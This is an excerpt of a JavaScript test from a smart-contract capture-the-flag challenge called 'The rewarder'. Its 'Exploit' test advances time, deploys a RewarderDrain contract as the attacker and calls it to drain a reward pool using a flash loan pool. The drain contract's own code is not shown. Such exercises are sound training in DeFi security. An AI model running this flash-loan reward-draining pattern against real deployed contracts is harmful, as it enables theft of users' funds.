...
const RewarderDrain = contract.fromArtifact('RewarderDrain');
...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        await time.increase(time.duration.days(5));
        const drainContract = await RewarderDrain.new(this.rewarderPool.address, {from : attacker});
        await drainContract.drain(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL, {from : attacker});
    });
